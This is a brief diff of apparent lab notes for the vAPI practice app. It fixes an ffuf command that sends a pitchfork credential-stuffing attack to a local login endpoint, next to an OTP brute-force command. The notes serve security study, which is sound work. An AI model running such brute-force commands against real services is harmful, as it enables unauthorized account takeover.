@@ -5,4 +5,4 @@ split -l 2000 -d wordlist.txt wordlist_part
 ffuf -w list.txt -X POST -d '{"otp":"FUZZ"}' -H "Content-Type: application/json" -u http://localhost/vapi/api4/otp/verify --mc 200 -s
 
 ## ffuf pitchfork
-ffuf -w emails.txt:FUZZ1 -w pwds.txt:FUZZ2 -b "{"email":FUZZ1,"password":FUZZ2}" -X POST -H "Content-Type: application/json" -u http://localhost/vapi/api2/user/login -fc 401 -mode pitchfork
+ffuf -w emails.txt:FUZZ1 -w pwds.txt:FUZZ2 -d "{"email":FUZZ1,"password":FUZZ2}" -X POST -H "Content-Type: application/json" -u http://localhost/vapi/api2/user/login -fc 401 -mode pitchfork
